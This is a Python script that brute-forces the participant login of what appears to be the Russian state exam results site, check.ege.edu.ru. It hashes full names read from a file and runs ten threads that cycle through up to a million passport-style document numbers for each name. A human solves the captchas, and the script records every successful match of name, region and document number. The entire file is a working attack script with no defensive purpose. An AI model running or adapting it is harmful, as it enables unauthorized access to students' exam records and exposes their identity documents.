import hashlib
import threading
import requests
import json
import os
import base64

from queue import Queue


base_path = "http://check.ege.edu.ru/"
# API
api = {
    "captcha": "api/captcha",
    "login": "api/participant/login",
    "region": "api/region"
}

token = ""
captcha = ""

code = ""
region = "61"

max_thread_count = 10

# If flag is true, captcha died and than checker get new one
captcha_died = threading.Event()
captcha_died.set()
captcha_status = threading.Condition()

# If current FIO is bruted flag will be False
bruted = threading.Event()
bruted.set()

# Create queue
queue = Queue()

# Get all FIOs from file
fios = open("fios.txt", "r", encoding="utf-8")


# Get hash of fullname
def get_hash(fullname):
    return hashlib.md5(fullname.lower().strip()
                       .replace(" ", "").replace("й", "и")
                       .replace("ё", "е").encode("utf-8"))\
                        .hexdigest()


class Brute(threading.Thread):
    def __init__(self, queue, name):
        threading.Thread.__init__(self)
        self.queue = queue
        self.name = name

    def run(self):
        print("Thread {} is starting".format(self.name))

        while True:

            # Pause thread if current FIO is bruted
            bruted.wait()

            # Get data from queue
            data = queue.get()

            sended = False
            while not sended:

                # Add captcha
                print("Get captcha data")
                data['payload']['captcha'] = captcha
                data['payload']['token'] = token

                print("Thread {} Sending request with hash: {}, doc: {}"
                      .format(self.name, data['payload']['Hash'], data['payload']['Document']))
                result, result_code = self.send_request(data['url'], data['payload'])

                print("Thread {} Got server answer: {} {}".format(self.name, result_code, result))

                # Check result
                if result_code == 204:
                    print("Great job! Login success")
                    print("Saving it to file")
                    self.save_to_file("good", data['fullname'],
                                      data['payload']['Document'],
                                      data['payload']['Region'])
                    sended = True
                    bruted.clear()
                elif result == '"Участник не найден"':
                    print("Login failed. Trying next one")
                    self.save_to_file("bad", data['fullname'],
                                      data['payload']['Document'],
                                      data['payload']['Region'])
                    sended = True
                elif result == '"Пожалуйста, проверьте правильность введённого кода с картинки"':
                    # Captcha die
                    print("Captcha die, trying to get new one")
                    self.get_captcha()
            self.queue.task_done()

        print("Thread {} died".format(self.name))

    def get_captcha(self):
        captcha_status.acquire()
        # Set flag to False, that captcha died
        if not captcha_died.is_set():
            captcha_died.set()

        captcha_status.wait()
        captcha_status.release()


    def send_request(self, url, payload):
        try:
            r = requests.post(url, data=payload)
            return r.text, r.status_code
        except BaseException:
            print("Error while sending request")
           # return -1, -1

    def save_to_file(self, type, fullname, document, region):
        if type == "good":
            filename = "good.txt"
        else:
            filename = "bad.txt"

        with open(filename, "a", encoding="utf-8") as file:
            file.write(fullname + " " + str(region) + " " + str(document) + "\n")


class Captcha(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        while True:
            captcha_died.wait()

            print("Checker found out that old captcha died. Getting new one")
            # Old captcha died, get new one
            self.get_new_captcha()
            captcha_died.clear()
            captcha_status.acquire()
            captcha_status.notify_all()
            captcha_status.release()

    def get_new_captcha(self):

        global captcha, token
        # Get new captcha
        solved = False

        while not solved:
            print("Send GET to " + base_path + api["captcha"])

            r = requests.get(base_path + api["captcha"])
            _json = json.loads(r.text)
            image = _json['Image']
            token = _json['Token']

            print("Got new captcha")

            with open("image.jpg", "wb") as file:
                file.write(base64.decodebytes(image.encode()))

            print("Open captcha to solve")
            print("Enter code: ")
            os.system("start " + "image.jpg")
            captcha = input().strip()

            status = requests.post(base_path + api["login"], data={
                "Captcha": captcha,
                "Code": "",
                "Document": "0000585858",
                "Hash": hashlib.md5("captcha".encode("utf-8")).hexdigest(),
                "Region": 61,
                "Token": token
            }).text

            if status != '"Пожалуйста, проверьте правильность введённого кода с картинки"':
                solved = True
            else:
                print("Error! Captcha isnt solved")
                print("Try to get new captcha")

        print("Captcha solved!")


checker = Captcha()
checker.setDaemon(True)
checker.start()

for i in range(max_thread_count):
    # Create thread
    BruteThread = Brute(queue, i)
    BruteThread.setDaemon(True)
    BruteThread.start()

# Pickup FIO from file
for fullname in fios:

    bruted.set()

    # Create hash from FIO
    _hash = get_hash(fullname)

    # Pickup document
    for document in range(0, 1000000):

        # Convert document to format
        document = str(document)
        while len(document) < 10:
            document = "0" + document

        # Add pairs to queue
        queue.put({
            "url": base_path + api['login'],
            "payload":
                {
                    "Code": code,
                    "Document": document,
                    "Hash": _hash,
                    "Region": region,
                },
            "fullname": fullname
        })

    while bruted.is_set() and queue.not_empty:
        pass
    bruted.clear()
    while not queue.empty():
        a = queue.get()
        queue.task_done()

queue.join()

print("Well done")
